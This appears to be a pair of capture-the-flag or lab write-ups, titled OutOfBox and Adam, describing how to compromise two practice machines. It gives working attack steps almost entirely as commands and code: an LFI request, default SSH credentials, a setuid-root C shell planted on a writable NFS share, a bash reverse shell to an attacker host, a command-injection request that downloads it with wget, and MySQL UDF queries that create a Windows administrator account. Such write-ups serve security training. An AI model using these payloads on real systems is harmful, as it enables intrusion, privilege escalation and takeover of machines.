OUTOFBOX WRITEUP

Information gathering
Scan the host using
1. nmap 192.168.x.53 -A
You will get port 80 accessible
open 192.168.x.53/robots.txt
You will get 2 md5 values which represent a directories
example : xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 

Exploitation
You will find an LFI vuln at
GET /xxxxxxxxxxxxxxxxxxxxxxxx/inc2.html?passwd 
There is a user called OutOfBox will appear in the response
You can use it to connect to ssh using
username : OutOfBox
password : OutOfBox
ssh OutOfBox@192.168.xx.53
OutOfBox@offsecsmtp:~$ id
uid=1001(OutOfBox) gid=1001(OutOfBox) groups=1001(OutOfBox)

Escalation
NFS share is writable, you can create an executable which is running using setuid(0) suitable suid bit, upload it to the shared folder and execute it, You will get root access
[root:~/Desktop]# showmount -e 192.168.xx.53
Export list for 192.168.xx.53:
/shared 192.168.xx.0/255.255.255.0
[root:~/Desktop]# mkdir /tmp/mymount
/bin/mkdir: created directory '/tmp/mymount'
[root:~/Desktop]# mount -t nfs 192.168.xx.53:/shared /tmp/mymount -o nolock
[root:~/Desktop]# cat /root/Desktop/exploit.c
#include <stdio.h>
#include <unistd.h>
int main(void)
{
setuid(0);
setgid(0);
system("/bin/bash");
}
gcc exploit.c -m32 -o exploit
[root:/tmp/mymount]# cp /root/Desktop/x /tmp/mymount/
[root:/tmp/mymount]# chmod u+s exploit
Now go to /shared folder on offsec machine, execute ./exploit and you’re root

 

 
 
ADAM WRITEUP

You'll find the port 80 open.
Send the following request to get an RCE

Create an index.php file on your host and add this content to it
bash -i >& /dev/tcp/YOUR_HOST/443 0>&1
Send the following request using burp to the host

POST /index.php?page=ping.php 
HTTP/1.1
Host: 192.168.x.67
User-Agent: xxxxxxxxxxxxxxxxxxxxxxx

ip=127.0.0.1 wget YOUR_HOST -O shell&send=Ping+It!

This will download the index file of yourhost as "shell"
Re run the job using
GET /index.php?page=job.php&job=JOB_ID 
HTTP/1.1
Host: 192.168.x.67
Accept: text/html,application/xhtml+xml,application/xml; q=0.9,*/*; q=0.8

Upload lib_mysqludf_sys.dll to C:\xampplite\htdocs
then upload adminer.php
connect to it and then execute following queries to call the lib

USE mysql; CREATE TABLE mytbl(line blob); INSERT INTO mytbl values(load_file('C:/xampplite/htdocs /lib_mysqludf_sys.dll')); SELECT * FROM mysql.mytbl INTO DUMPFILE 'c:/windows/system32/lib_mysqludf_sys_32.dll'; CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll'; SELECT sys_exec("net user testu P@ssw0rd /add"); SELECT sys_exec("net localgroup Administrators testu /add"); 

this will add user to the administrator group
use it, and you're admin
